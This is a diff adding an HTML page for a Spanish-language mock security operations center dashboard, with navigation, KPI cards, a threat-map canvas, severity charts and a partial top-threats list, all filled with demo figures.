@@ -1,0 +1,2871 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AutoNovations | Virtual Security Operations Center (VSOC)</title>
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        tech: ['Orbitron', 'sans-serif'],
+                        body: ['Outfit', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        darkBg: '#080b11',
+                        darkSide: '#05070c',
+                        cardBg: 'rgba(13, 18, 34, 0.85)',
+                        cyber: '#00f0ff',
+                        hacker: '#22c55e',
+                        alert: '#ff003c',
+                        warning: '#f97316',
+                        medium: '#eab308',
+                        info: '#8b5cf6',
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    
+    <style>
+        :root {
+            --glow-cyber: 0 0 15px rgba(0, 240, 255, 0.25);
+            --glow-alert: 0 0 15px rgba(255, 0, 60, 0.25);
+            --glow-warning: 0 0 15px rgba(249, 115, 22, 0.25);
+        }
+
+        body {
+            background-color: #080b11;
+            color: #f8fafc;
+            overflow-x: hidden;
+        }
+
+        /* Glassmorphic card design */
+        .glass-card {
+            background: rgba(13, 18, 34, 0.8);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.4);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .glass-card:hover {
+            border-color: rgba(255, 255, 255, 0.08);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+            transform: translateY(-2px);
+        }
+
+        /* Ambient grid overlay */
+        .grid-bg {
+            background-size: 40px 40px;
+            background-image: 
+                linear-gradient(to right, rgba(255, 255, 255, 0.01) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(255, 255, 255, 0.01) 1px, transparent 1px);
+        }
+
+        /* Webkit scrollbar customizations */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #05070c;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(59, 130, 246, 0.25);
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(59, 130, 246, 0.5);
+        }
+
+        /* Pulse red alerts */
+        @keyframes redPulse {
+            0%, 100% { background-color: rgba(255, 0, 60, 0.03); }
+            50% { background-color: rgba(255, 0, 60, 0.15); }
+        }
+        .alarm-alert {
+            animation: redPulse 1.5s infinite;
+        }
+
+        /* SweetAlert Cyber Customizations */
+        .vsoc-swal-popup {
+            background: rgba(13, 18, 34, 0.95) !important;
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.08) !important;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.7) !important;
+            color: #f8fafc !important;
+            border-radius: 16px !important;
+        }
+
+        /* Progress bars animation */
+        @keyframes barProgress {
+            from { width: 0%; }
+        }
+        .progress-bar-fill {
+            animation: barProgress 1s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+        }
+    </style>
+</head>
+<body class="font-body selection:bg-blue-600 selection:text-white min-h-screen flex relative overflow-hidden">
+    <!-- Grid overlay & alarm active layer -->
+    <div class="absolute inset-0 grid-bg pointer-events-none z-0"></div>
+    <div id="alarmOverlay" class="fixed inset-0 pointer-events-none z-10 transition-all duration-700 opacity-0 bg-red-600/5"></div>
+
+    <!-- SIDEBAR -->
+    <aside id="sidebar" class="w-64 shrink-0 bg-[#05070c] border-r border-slate-900/60 flex flex-col justify-between py-6 px-4 z-20 transition-all duration-300 relative">
+        <div class="space-y-6">
+            <!-- Logo area -->
+            <div class="flex items-center gap-3 px-2 mb-2">
+                <div class="w-9 h-9 rounded-lg bg-blue-600 flex items-center justify-center shadow-lg shadow-blue-500/25 shrink-0">
+                    <i data-lucide="shield" class="w-5 h-5 text-white animate-pulse"></i>
+                </div>
+                <div class="sidebar-text-element transition-opacity duration-200">
+                    <h1 class="font-tech font-bold text-base leading-none tracking-wider text-white">VSOC</h1>
+                    <p class="text-[9px] text-slate-500 font-mono mt-0.5">Virtual Security Operations</p>
+                </div>
+            </div>
+
+            <!-- Navigation Links -->
+            <nav class="space-y-1" id="sidebar-nav">
+                <!-- Links will be toggled by JS -->
+                <button onclick="switchTab('general')" id="btn-tab-general" class="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide transition-all bg-[#15254d] text-blue-400 border-l-4 border-blue-500">
+                    <i data-lucide="layout-dashboard" class="w-4.5 h-4.5"></i>
+                    <span class="sidebar-text-element">VISTA GENERAL</span>
+                </button>
+                <button onclick="switchTab('alertas')" id="btn-tab-alertas" class="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide transition-all text-slate-400 hover:text-white hover:bg-slate-900/40">
+                    <i data-lucide="bell" class="w-4.5 h-4.5"></i>
+                    <span class="sidebar-text-element">ALERTAS</span>
+                </button>
+                <button onclick="switchTab('incidentes')" id="btn-tab-incidentes" class="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide transition-all text-slate-400 hover:text-white hover:bg-slate-900/40">
+                    <i data-lucide="shield-alert" class="w-4.5 h-4.5"></i>
+                    <span class="sidebar-text-element">INCIDENTES</span>
+                </button>
+                <button onclick="switchTab('casos')" id="btn-tab-casos" class="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide transition-all text-slate-400 hover:text-white hover:bg-slate-900/40">
+                    <i data-lucide="folder-kanban" class="w-4.5 h-4.5"></i>
+                    <span class="sidebar-text-element">CASOS</span>
+                </button>
+                <button onclick="switchTab('amenazas')" id="btn-tab-amenazas" class="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide transition-all text-slate-400 hover:text-white hover:bg-slate-900/40">
+                    <i data-lucide="globe-2" class="w-4.5 h-4.5"></i>
+                    <span class="sidebar-text-element">INTELIGENCIA AMENAZAS</span>
+                </button>
+                <button onclick="switchTab('monitoreo')" id="btn-tab-monitoreo" class="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide transition-all text-slate-400 hover:text-white hover:bg-slate-900/40">
+                    <i data-lucide="activity" class="w-4.5 h-4.5"></i>
+                    <span class="sidebar-text-element">MONITOREO DE NODOS</span>
+                </button>
+                <button onclick="switchTab('activos')" id="btn-tab-activos" class="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide transition-all text-slate-400 hover:text-white hover:bg-slate-900/40">
+                    <i data-lucide="server" class="w-4.5 h-4.5"></i>
+                    <span class="sidebar-text-element">ACTIVOS</span>
+                </button>
+                <button onclick="switchTab('usuarios')" id="btn-tab-usuarios" class="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide transition-all text-slate-400 hover:text-white hover:bg-slate-900/40">
+                    <i data-lucide="users" class="w-4.5 h-4.5"></i>
+                    <span class="sidebar-text-element">USUARIOS</span>
+                </button>
+                <button onclick="switchTab('vulnerabilidades')" id="btn-tab-vulnerabilidades" class="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide transition-all text-slate-400 hover:text-white hover:bg-slate-900/40">
+                    <i data-lucide="scan-line" class="w-4.5 h-4.5"></i>
+                    <span class="sidebar-text-element">VULNERABILIDADES</span>
+                </button>
+                <button onclick="switchTab('reportes')" id="btn-tab-reportes" class="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide transition-all text-slate-400 hover:text-white hover:bg-slate-900/40">
+                    <i data-lucide="file-bar-chart2" class="w-4.5 h-4.5"></i>
+                    <span class="sidebar-text-element">REPORTES</span>
+                </button>
+                <button onclick="switchTab('dashboards')" id="btn-tab-dashboards" class="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide transition-all text-slate-400 hover:text-white hover:bg-slate-900/40">
+                    <i data-lucide="pie-chart" class="w-4.5 h-4.5"></i>
+                    <span class="sidebar-text-element">DASHBOARDS</span>
+                </button>
+                <button onclick="switchTab('configuracion')" id="btn-tab-configuracion" class="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide transition-all text-slate-400 hover:text-white hover:bg-slate-900/40">
+                    <i data-lucide="terminal" class="w-4.5 h-4.5"></i>
+                    <span class="sidebar-text-element">CONSOLA (CONFIG)</span>
+                </button>
+            </nav>
+        </div>
+
+        <!-- Sidebar Footer -->
+        <div class="space-y-4">
+            <div class="h-px bg-slate-900"></div>
+            <button onclick="toggleSidebar()" class="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-semibold tracking-wide text-slate-500 hover:text-white hover:bg-slate-900/40 transition-all">
+                <i data-lucide="chevrons-left" id="collapse-icon" class="w-4.5 h-4.5 transition-transform duration-300"></i>
+                <span id="lbl-collapse-menu" class="sidebar-text-element">Colapsar menú</span>
+            </button>
+        </div>
+    </aside>
+
+    <!-- CONTENT WRAPPER -->
+    <div class="flex-grow flex flex-col min-w-0 overflow-y-auto z-10 relative">
+        
+        <!-- HEADER -->
+        <header class="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 py-4 px-8 border-b border-slate-900 bg-[#06080e]/95 backdrop-blur-md sticky top-0 z-30">
+            <div>
+                <h2 class="text-xl font-bold text-white tracking-tight" id="view-title">Vista General</h2>
+                <p class="text-xs text-slate-400 mt-0.5" id="view-subtitle">Resumen de la postura de seguridad y operaciones en tiempo real.</p>
+            </div>
+
+            <!-- Controls and Tickers -->
+            <div class="flex flex-wrap items-center gap-4 text-xs">
+                <!-- Shift details -->
+                <div class="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-slate-900/60 border border-slate-800">
+                    <span class="w-2 h-2 rounded-full bg-blue-500 animate-pulse"></span>
+                    <span class="text-[10px] font-semibold tracking-wider uppercase text-blue-400" id="lbl-shift">Turno: NOC - Tarde</span>
+                </div>
+
+                <!-- Clock ticker -->
+                <div class="px-3 py-1.5 rounded-lg bg-slate-900/60 border border-slate-800 font-mono text-[11px] text-slate-300" id="header-clock">
+                    14:32:18 &nbsp;&nbsp; 20/05/2024
+                </div>
+
+                <!-- Simulation Trigger -->
+                <button onclick="triggerIntrusion()" class="px-4 py-1.5 rounded-lg border border-red-500/30 bg-red-500/10 text-red-400 font-bold hover:bg-red-500 hover:text-white transition-all shadow-[0_0_10px_rgba(239,68,68,0.05)] hover:shadow-[0_0_15px_rgba(239,68,68,0.2)] text-[10px] tracking-wider uppercase" id="btn-mock">
+                    Simular Intrusión
+                </button>
+
+                <!-- Language Toggles -->
+                <div class="flex border border-slate-800 rounded-lg overflow-hidden">
+                    <button onclick="changeLang('es')" id="lang-es" class="px-2.5 py-1.5 text-[10px] font-bold bg-blue-600/20 text-blue-400">ES</button>
+                    <button onclick="changeLang('en')" id="lang-en" class="px-2.5 py-1.5 text-[10px] font-bold text-slate-500 hover:text-slate-200 transition-colors">EN</button>
+                </div>
+
+                <!-- Sound Control -->
+                <button onclick="toggleSound()" class="p-1.5 rounded-lg bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-blue-400 transition-colors" id="soundBtn" title="Audio">
+                    <i data-lucide="volume-2" class="w-4 h-4"></i>
+                </button>
+
+                <!-- Mesh status & analyst -->
+                <div class="flex items-center gap-3 border-l border-slate-850 pl-4">
+                    <div class="relative">
+                        <i data-lucide="bell" class="w-5 h-5 text-slate-400 hover:text-white transition-colors cursor-pointer"></i>
+                        <span class="absolute -top-1 -right-1 w-4 h-4 bg-red-600 text-white rounded-full flex items-center justify-center text-[9px] font-bold">12</span>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center font-bold text-xs text-slate-300">AR</div>
+                        <div class="hidden lg:block text-left">
+                            <div class="font-bold text-slate-200 leading-none text-[11px]">Analista</div>
+                            <div class="text-[9px] text-emerald-400 flex items-center gap-1 mt-0.5 leading-none">
+                                <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 inline-block animate-pulse"></span>
+                                <span id="lbl-analyst-status">En línea</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- MAIN VIEW CONTENT -->
+        <main class="p-6 space-y-6 flex-grow">
+
+            <!-- VIEW: VISTA GENERAL (DASHBOARD) -->
+            <div id="view-general-container" class="space-y-6">
+                <!-- KPI Stats Cards Row (6 columns) -->
+                <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4">
+                    <!-- KPI Card 1: Alertas Totales -->
+                    <div class="glass-card p-4 rounded-xl flex flex-col justify-between h-[105px]">
+                        <div class="flex justify-between items-start">
+                            <span class="text-[10px] font-bold text-slate-400 tracking-wide uppercase" id="lbl-card-total">Alertas Totales</span>
+                            <div class="p-1.5 rounded-lg bg-red-500/10 text-red-500 shrink-0">
+                                <i data-lucide="alert-triangle" class="w-4.5 h-4.5"></i>
+                            </div>
+                        </div>
+                        <div class="my-1.5">
+                            <span class="text-xl font-bold font-tech text-white" id="kpi-total-val">1,248</span>
+                        </div>
+                        <div class="flex justify-between items-center gap-2">
+                            <span class="text-[10px] text-emerald-400 flex items-center gap-0.5 font-medium shrink-0">
+                                <i data-lucide="arrow-down-right" class="w-3.5 h-3.5"></i>
+                                <span>18% vs ayer</span>
+                            </span>
+                            <canvas id="sparkline-total" class="w-[60px] h-[18px]"></canvas>
+                        </div>
+                    </div>
+
+                    <!-- KPI Card 2: Alertas Criticas -->
+                    <div class="glass-card p-4 rounded-xl flex flex-col justify-between h-[105px]">
+                        <div class="flex justify-between items-start">
+                            <span class="text-[10px] font-bold text-slate-400 tracking-wide uppercase" id="lbl-card-critical">Alertas Críticas</span>
+                            <div class="p-1.5 rounded-lg bg-red-600/10 text-red-500 shrink-0 shadow-[0_0_8px_rgba(239,68,68,0.1)]">
+                                <i data-lucide="shield-x" class="w-4.5 h-4.5 animate-pulse"></i>
+                            </div>
+                        </div>
+                        <div class="my-1.5">
+                            <span class="text-xl font-bold font-tech text-red-500" id="kpi-critical-val">156</span>
+                        </div>
+                        <div class="flex justify-between items-center gap-2">
+                            <span class="text-[10px] text-red-400 flex items-center gap-0.5 font-medium shrink-0">
+                                <i data-lucide="arrow-up-right" class="w-3.5 h-3.5"></i>
+                                <span>22% vs ayer</span>
+                            </span>
+                            <canvas id="sparkline-critical" class="w-[60px] h-[18px]"></canvas>
+                        </div>
+                    </div>
+
+                    <!-- KPI Card 3: Alertas Altas -->
+                    <div class="glass-card p-4 rounded-xl flex flex-col justify-between h-[105px]">
+                        <div class="flex justify-between items-start">
+                            <span class="text-[10px] font-bold text-slate-400 tracking-wide uppercase" id="lbl-card-high">Alertas Altas</span>
+                            <div class="p-1.5 rounded-lg bg-orange-500/10 text-orange-500 shrink-0">
+                                <i data-lucide="flame" class="w-4.5 h-4.5"></i>
+                            </div>
+                        </div>
+                        <div class="my-1.5">
+                            <span class="text-xl font-bold font-tech text-orange-500" id="kpi-high-val">392</span>
+                        </div>
+                        <div class="flex justify-between items-center gap-2">
+                            <span class="text-[10px] text-orange-400 flex items-center gap-0.5 font-medium shrink-0">
+                                <i data-lucide="arrow-up-right" class="w-3.5 h-3.5"></i>
+                                <span>15% vs ayer</span>
+                            </span>
+                            <canvas id="sparkline-high" class="w-[60px] h-[18px]"></canvas>
+                        </div>
+                    </div>
+
+                    <!-- KPI Card 4: Incidentes Activos -->
+                    <div class="glass-card p-4 rounded-xl flex flex-col justify-between h-[105px]">
+                        <div class="flex justify-between items-start">
+                            <span class="text-[10px] font-bold text-slate-400 tracking-wide uppercase" id="lbl-card-active">Incidentes Activos</span>
+                            <div class="p-1.5 rounded-lg bg-purple-500/10 text-purple-400 shrink-0">
+                                <i data-lucide="clock" class="w-4.5 h-4.5"></i>
+                            </div>
+                        </div>
+                        <div class="my-1.5">
+                            <span class="text-xl font-bold font-tech text-purple-400" id="kpi-incidents-val">37</span>
+                        </div>
+                        <div class="flex justify-between items-center gap-2">
+                            <span class="text-[10px] text-purple-400 flex items-center gap-0.5 font-medium shrink-0">
+                                <i data-lucide="arrow-up-right" class="w-3.5 h-3.5"></i>
+                                <span>12% vs ayer</span>
+                            </span>
+                            <canvas id="sparkline-incidents" class="w-[60px] h-[18px]"></canvas>
+                        </div>
+                    </div>
+
+                    <!-- KPI Card 5: Activos Monitoreados -->
+                    <div class="glass-card p-4 rounded-xl flex flex-col justify-between h-[105px]">
+                        <div class="flex justify-between items-start">
+                            <span class="text-[10px] font-bold text-slate-400 tracking-wide uppercase" id="lbl-card-assets">Activos Monitoreados</span>
+                            <div class="p-1.5 rounded-lg bg-blue-500/10 text-blue-400 shrink-0">
+                                <i data-lucide="cpu" class="w-4.5 h-4.5"></i>
+                            </div>
+                        </div>
+                        <div class="my-1.5">
+                            <span class="text-xl font-bold font-tech text-white" id="kpi-assets-val">4,892</span>
+                        </div>
+                        <div class="flex justify-between items-center gap-2">
+                            <span class="text-[10px] text-blue-400 flex items-center gap-0.5 font-medium shrink-0">
+                                <i data-lucide="arrow-down-right" class="w-3.5 h-3.5"></i>
+                                <span>8% vs ayer</span>
+                            </span>
+                            <canvas id="sparkline-assets" class="w-[60px] h-[18px]"></canvas>
+                        </div>
+                    </div>
+
+                    <!-- KPI Card 6: Usuarios Monitoreados -->
+                    <div class="glass-card p-4 rounded-xl flex flex-col justify-between h-[105px]">
+                        <div class="flex justify-between items-start">
+                            <span class="text-[10px] font-bold text-slate-400 tracking-wide uppercase" id="lbl-card-users">Usuarios Monitoreados</span>
+                            <div class="p-1.5 rounded-lg bg-emerald-500/10 text-emerald-400 shrink-0">
+                                <i data-lucide="user-check" class="w-4.5 h-4.5"></i>
+                            </div>
+                        </div>
+                        <div class="my-1.5">
+                            <span class="text-xl font-bold font-tech text-white" id="kpi-users-val">2,103</span>
+                        </div>
+                        <div class="flex justify-between items-center gap-2">
+                            <span class="text-[10px] text-emerald-400 flex items-center gap-0.5 font-medium shrink-0">
+                                <i data-lucide="arrow-up-right" class="w-3.5 h-3.5"></i>
+                                <span>6% vs ayer</span>
+                            </span>
+                            <canvas id="sparkline-users" class="w-[60px] h-[18px]"></canvas>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Content Grid Row 1 (Threat Map + Doughnut + Trend) -->
+                <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+                    <!-- Mapa de Amenazas en Tiempo Real (5 cols) -->
+                    <div class="glass-card p-5 rounded-2xl lg:col-span-5 flex flex-col min-h-[350px]">
+                        <div class="flex justify-between items-center mb-4">
+                            <h3 class="font-tech text-xs tracking-wider text-blue-400 flex items-center gap-2 uppercase">
+                                <i data-lucide="globe" class="w-4 h-4 text-blue-400"></i>
+                                <span id="lbl-map-title">Mapa de Amenazas en Tiempo Real</span>
+                            </h3>
+                            <span class="px-2 py-0.5 rounded bg-red-500/20 border border-red-500/40 text-red-500 text-[9px] font-mono animate-pulse uppercase" id="lbl-live-radar">Radar Vivo</span>
+                        </div>
+                        <div class="flex-grow bg-slate-950/70 border border-slate-900 rounded-xl overflow-hidden relative min-h-[220px]">
+                            <!-- Normalized wireframe canvas world map + arc threat beams -->
+                            <canvas id="threatMapCanvas" class="w-full h-full"></canvas>
+                            
+                            <!-- Threat map coordinates HUD -->
+                            <div class="absolute bottom-2 left-2 pointer-events-none font-mono text-[9px] text-slate-500 bg-slate-950/90 p-2 border border-slate-900 rounded-lg">
+                                <div>TARGET: BOGOTÁ DEFENSER (4.6097° N, 74.0817° W)</div>
+                                <div>THREATS BLOCKED: <span id="map-counter" class="text-blue-400 font-bold">2,780</span></div>
+                            </div>
+                            
+                            <!-- Legend -->
+                            <div class="absolute bottom-2 right-2 pointer-events-none font-mono text-[8px] space-y-1 bg-slate-950/90 p-2 border border-slate-900 rounded-lg">
+                                <div class="text-[9px] font-bold text-slate-400 mb-0.5" id="lbl-map-legend">NIVEL DE AMENAZA</div>
+                                <div class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-red-500"></span><span class="text-slate-400" id="lbl-leg-crit">Crítico</span></div>
+                                <div class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-orange-500"></span><span class="text-slate-400" id="lbl-leg-high">Alto</span></div>
+                                <div class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-yellow-500"></span><span class="text-slate-400" id="lbl-leg-med">Medio</span></div>
+                                <div class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-blue-500"></span><span class="text-slate-400" id="lbl-leg-low">Bajo</span></div>
+                                <div class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-purple-500"></span><span class="text-slate-400" id="lbl-leg-info">Informativo</span></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Alertas por Severidad (3 cols) -->
+                    <div class="glass-card p-5 rounded-2xl lg:col-span-3 flex flex-col min-h-[350px]">
+                        <div class="flex justify-between items-center mb-4">
+                            <h3 class="font-tech text-xs tracking-wider text-blue-400 flex items-center gap-2 uppercase">
+                                <i data-lucide="donut" class="w-4 h-4"></i>
+                                <span id="lbl-doughnut-title">Alertas por Severidad</span>
+                            </h3>
+                            <select class="bg-slate-900 text-[10px] text-slate-400 border border-slate-800 rounded px-1.5 py-0.5 outline-none" id="dropdown-doughnut-time">
+                                <option>Últimas 24 horas</option>
+                            </select>
+                        </div>
+                        <div class="flex-grow flex flex-col justify-center items-center">
+                            <div class="relative w-full h-44 flex items-center justify-center mb-4">
+                                <canvas id="doughnutChart"></canvas>
+                                <div class="absolute flex flex-col items-center justify-center">
+                                    <span class="text-xl font-bold font-tech text-white" id="doughnut-total-center">1,248</span>
+                                    <span class="text-[9px] text-slate-500 uppercase tracking-widest" id="lbl-total-doughnut-label">Total</span>
+                                </div>
+                            </div>
+
+                            <!-- Legend Details -->
+                            <div class="w-full space-y-1.5 text-[11px] font-mono">
+                                <div class="flex justify-between items-center">
+                                    <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-red-600"></span><span class="text-slate-400" id="leg-det-crit">Críticas</span></div>
+                                    <span class="text-slate-200" id="doughnut-val-crit">156 (12%)</span>
+                                </div>
+                                <div class="flex justify-between items-center">
+                                    <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-orange-500"></span><span class="text-slate-400" id="leg-det-high">Altas</span></div>
+                                    <span class="text-slate-200" id="doughnut-val-high">392 (31%)</span>
+                                </div>
+                                <div class="flex justify-between items-center">
+                                    <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-yellow-500"></span><span class="text-slate-400" id="leg-det-med">Medias</span></div>
+                                    <span class="text-slate-200" id="doughnut-val-med">512 (41%)</span>
+                                </div>
+                                <div class="flex justify-between items-center">
+                                    <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-blue-500"></span><span class="text-slate-400" id="leg-det-low">Bajas</span></div>
+                                    <span class="text-slate-200" id="doughnut-val-low">128 (10%)</span>
+                                </div>
+                                <div class="flex justify-between items-center">
+                                    <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-purple-500"></span><span class="text-slate-400" id="leg-det-info">Informativas</span></div>
+                                    <span class="text-slate-200" id="doughnut-val-info">60 (5%)</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Tendencia de Alertas (4 cols) -->
+                    <div class="glass-card p-5 rounded-2xl lg:col-span-4 flex flex-col min-h-[350px]">
+                        <div class="flex justify-between items-center mb-4">
+                            <h3 class="font-tech text-xs tracking-wider text-blue-400 flex items-center gap-2 uppercase">
+                                <i data-lucide="trending-up" class="w-4 h-4"></i>
+                                <span id="lbl-trend-title">Tendencia de Alertas</span>
+                            </h3>
+                            <select class="bg-slate-900 text-[10px] text-slate-400 border border-slate-800 rounded px-1.5 py-0.5 outline-none" id="dropdown-trend-time">
+                                <option>Últimos 7 días</option>
+                            </select>
+                        </div>
+                        <div class="flex-grow relative h-48">
+                            <canvas id="lineChart"></canvas>
+                        </div>
+                        <!-- Line chart custom legend -->
+                        <div class="flex flex-wrap justify-center gap-x-4 gap-y-1 mt-4 text-[10px] font-mono text-slate-400">
+                            <div class="flex items-center gap-1.5"><span class="w-2 h-0.5 bg-red-500 inline-block"></span><span id="trend-leg-crit">Críticas</span></div>
+                            <div class="flex items-center gap-1.5"><span class="w-2 h-0.5 bg-orange-500 inline-block"></span><span id="trend-leg-high">Altas</span></div>
+                            <div class="flex items-center gap-1.5"><span class="w-2 h-0.5 bg-yellow-500 inline-block"></span><span id="trend-leg-med">Medias</span></div>
+                            <div class="flex items-center gap-1.5"><span class="w-2 h-0.5 bg-blue-500 inline-block"></span><span id="trend-leg-low">Bajas</span></div>
+                            <div class="flex items-center gap-1.5"><span class="w-2 h-0.5 bg-purple-500 inline-block"></span><span id="trend-leg-info">Informativas</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Content Grid Row 2 (Recent Alerts + Top Threats + Active Incidents) -->
+                <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+                    <!-- Alertas Recientes (5 cols) -->
+                    <div class="glass-card p-5 rounded-2xl lg:col-span-5 flex flex-col h-[340px]">
+                        <div class="flex justify-between items-center mb-4">
+                            <h3 class="font-tech text-xs tracking-wider text-blue-400 flex items-center gap-2 uppercase">
+                                <i data-lucide="list" class="w-4 h-4"></i>
+                                <span id="lbl-recent-alerts-title">Alertas Recientes</span>
+                            </h3>
+                            <span class="text-slate-500 text-[10px] font-mono" id="lbl-click-forensics">Click en fila para forense</span>
+                        </div>
+                        <div class="flex-grow overflow-x-auto">
+                            <table class="w-full text-left text-[11px] font-mono border-collapse">
+                                <thead>
+                                    <tr class="border-b border-slate-900 text-slate-500">
+                                        <th class="py-2 pr-2 font-semibold" id="tbl-h-time">TIEMPO</th>
+                                        <th class="py-2 px-2 font-semibold" id="tbl-h-severity">SEVERIDAD</th>
+                                        <th class="py-2 px-2 font-semibold" id="tbl-h-rule">REGLA / DESCRIPCIÓN</th>
+                                        <th class="py-2 px-2 font-semibold" id="tbl-h-source">FUENTE</th>
+                                        <th class="py-2 pl-2 font-semibold" id="tbl-h-dest">DESTINO</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="recent-alerts-tbody" class="divide-y divide-slate-900/60 cursor-pointer select-none">
+                                    <!-- Populated dynamically by JS simulation -->
+                                </tbody>
+                            </table>
+                        </div>
+                        <div class="mt-3 pt-3 border-t border-slate-900 flex justify-start">
+                            <button onclick="switchTab('alertas')" class="text-blue-400 hover:text-blue-300 font-semibold text-xs flex items-center gap-1 group" id="lbl-view-all-alerts">
+                                Ver todas las alertas 
+                                <i data-lucide="arrow-right" class="w-4 h-4 transition-transform group-hover:translate-x-1"></i>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Top Amenazas Detectadas (3 cols) -->
+                    <div class="glass-card p-5 rounded-2xl lg:col-span-3 flex flex-col h-[340px]">
+                        <div class="flex justify-between items-center mb-4">
+                            <h3 class="font-tech text-xs tracking-wider text-blue-400 flex items-center gap-2 uppercase">
+                                <i data-lucide="activity" class="w-4 h-4"></i>
+                                <span id="lbl-top-threats-title">Top Amenazas Detectadas</span>
+                            </h3>
+                            <select class="bg-slate-900 text-[10px] text-slate-400 border border-slate-800 rounded px-1.5 py-0.5 outline-none" id="dropdown-threats-time">
+                                <option>Últimas 24 horas</option>
+                            </select>
+                        </div>
+                        <!-- Threats list -->
+                        <div class="flex-grow space-y-3 mt-1 text-[11px] font-mono" id="top-threats-list">
+                            <!-- Malware (Red) -->
+                            <div class="space-y-1">
+                                <div class="flex justify-between text-[11px]">
+                                    <span class="text-slate-300 font-bold">Malware</span>
+                                    <span class="text-red-500 font-bold">28%</span>
+                                </div>
+                                <div class="w-full h-1.5 bg-slate-900 rounded-full overflow-hidden">
+                                    <div class="h-full bg-red-600 rounded-full progress-bar-fill" style="width: 28%"></div>
+                                </div>
+                            </div>
+                            <!-- Brute Force (Orange) -->
+                            <div class="space-y-1">
+                                <div class="flex justify-between text-[11px]">
+                                    <span class="text-slate-300 font-bold">Fuerza Bruta</span>
+                                    <span class="text-orange-500 font-bold">22%</span>
+                                </div>
+                                <div class="w-full h-1.5 bg-slate-900 rounded-full overflow-hidden">
+                                    <div class="h-full bg-orange-500 rounded-full progress-bar-fill" style="width: 22%"></div>
+                                </div>
+                            </div>
+                            <!-- Vulnerability Exploit (Yellow) -->
+                            <div class="space-y-1">
+                                <div class="flex justify-between text-[11px]">
+                                    <span class="text-slate-300 font-bold">Explotación de Vulnerabilidades</span>
+                                    <span class="text-yellow-500 font-bold">18%</span>
+                                </div>
+                                <div class="w-full h-1.5 bg-slate-900 rounded-full overflow-hidden">
+                                    <div class="h-full bg-yellow-500 rounded-full progress-bar-fill" style="width: 18%"></div>
+                                </div>
+                            </div>
+                            <!-- Phishing (Light yellow/green) -->
+                            <div class="space-y-1">
+                                <div class="flex justify-between text-[11px]">
+                                    <span class="text-slate-300 font-bold">Phishing</span>
